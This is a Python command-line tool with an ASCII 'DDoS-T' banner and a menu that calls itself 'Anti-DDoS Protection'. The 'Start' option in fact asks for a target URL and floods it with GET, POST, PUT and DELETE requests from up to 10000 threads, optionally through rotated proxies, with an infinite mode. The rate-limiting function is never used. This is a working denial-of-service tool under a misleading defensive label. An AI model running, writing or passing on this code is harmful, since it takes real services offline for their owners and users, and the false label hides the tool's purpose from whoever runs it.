
import os
import time
import requests
import logging
import random
from flask import Flask
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

app = Flask(__name__)

# Constants
MAX_REQUESTS_PER_SECOND = 20
IP_REQUEST_MAP = {}
REQUEST_LOG = []
lock = threading.Lock()
threads = []  # To keep track of threads

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_green(text):
    print("\033[92m" + text + "\033[0m")

def log_request(status):
    with lock:
        REQUEST_LOG.append(status)

def menu():
    clear_screen()
    print_green("""
  _____  _____   ____   _____ _   _   _   _______ 
 |  __ \|  __ \ / __ \ / ____| \ | | ( ) |__   __|
 | |  | | |  | | |  | | (___ |  \| |  \|    | |   
 | |  | | |  | | |  | |\___ \| . ` |        | |   
 | |__| | |__| | |__| |____) | |\  |        | |   
 |_____/|_____/ \____/|_____/|_| \_|        |_|   
    """)
    print_green("1. Start Anti-DDoS Protection")
    print_green("2. Stop Anti-DDoS Protection")
    print_green("3. Show Request Log")
    print_green("4. Exit")

def limit_traffic(ip):
    current_time = time.time()
    if ip not in IP_REQUEST_MAP:
        IP_REQUEST_MAP[ip] = [current_time]
    else:
        requests = IP_REQUEST_MAP[ip]
        requests = [t for t in requests if current_time - t < 1]
        requests.append(current_time)
        IP_REQUEST_MAP[ip] = requests

    return len(IP_REQUEST_MAP[ip]) > MAX_REQUESTS_PER_SECOND

def send_request(url, method, proxies, total_sent, error_messages):
    ip = "8.8.8.8"  # Simulated IP address for testing outside Flask
    error_503_logged = False  # Flag to track if 503 error has been logged

    try:
        if method == "GET":
            response = requests.get(url, proxies=proxies, timeout=5)
        elif method == "POST":
            response = requests.post(url, proxies=proxies, timeout=5)
        elif method == "PUT":
            response = requests.put(url, proxies=proxies, timeout=5)
        elif method == "DELETE":
            response = requests.delete(url, proxies=proxies, timeout=5)

        status = f"{method} request to {url}: {response.status_code}"
        log_request(status)
        if response.status_code == 200:
            print("Request accepted.")
        elif response.status_code == 503 and not error_503_logged:
            print("Service Unavailable (503). This error will be reported only once.")
            error_messages.append("Service Unavailable (503)")
            error_503_logged = True  # Set the flag to True after logging the error
        else:
            print("Request rejected. Status code:", response.status_code)
    except requests.RequestException as e:
        error_messages.append(str(e))

def flood(url, count, interval, proxy_list):
    error_messages = []
    methods = ["GET", "POST", "PUT", "DELETE"]
    total_sent = 0

    with ThreadPoolExecutor(max_workers=10000) as executor:
        futures = []
        while count == -1 or total_sent < count:
            try:
                proxy = random.choice(proxy_list) if proxy_list else None
                proxies = {"http": proxy, "https": proxy} if proxy else None

                for method in methods:
                    futures.append(executor.submit(send_request, url, method, proxies, total_sent + 1, error_messages))

                total_sent += len(methods)

                if interval > 0:
                    time.sleep(interval)
            except KeyboardInterrupt:
                print("Operation cancelled by user.")
                break

        for future in as_completed(futures):
            try:
                if future.result():
                    total_sent += 1
            except Exception:
                pass

    # Display a single summary message about errors
    if error_messages:
        print(f"Errors occurred during the request process: {len(error_messages)} errors.")
    else:
        print("All requests completed successfully.")

    logging.info(f"Total requests sent to {url}: {total_sent}")

def load_proxies(proxy_file):
    try:
        with open(proxy_file, 'r') as file:
            return list(set(line.strip() for line in file.readlines()))
    except FileNotFoundError:
        print("Proxy file not found. Continuing without proxies.")
        return []

def start_protection():
    url = input("Enter the target URL (e.g., http://example.com): ")
    packet_count = int(input("Enter the number of requests to send (-1 for infinite): "))
    interval = float(input("Enter the interval between requests (in seconds, use 0 for fastest): "))

    use_proxies = input("Do you want to use proxies? (yes/no): ").lower() == 'yes'
    proxy_list = []

    if use_proxies:
        proxy_file = input("Enter the path to the proxy list file: ")
        proxy_list = load_proxies(proxy_file)

    print(f"Starting flood for {url}...")
    flood(url, packet_count, interval, proxy_list)

def stop_protection():
    print("Stopping Anti-DDoS protection...")
    time.sleep(2)
    print("Anti-DDoS protection stopped.")

def show_request_log():
    print("Request Log:")
    for entry in REQUEST_LOG:
        print(entry)

@app.route('/')
def index():
    return "Homepage!"

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    menu()
    while True:
        option = input("Select an option: ")

        if option == "1":
            start_protection()
        elif option == "2":
            stop_protection()
        elif option == "3":
            show_request_log()
        elif option == "4":
            print("Exiting...")
            break
        else:
            print("Invalid option. Please select a valid option.")
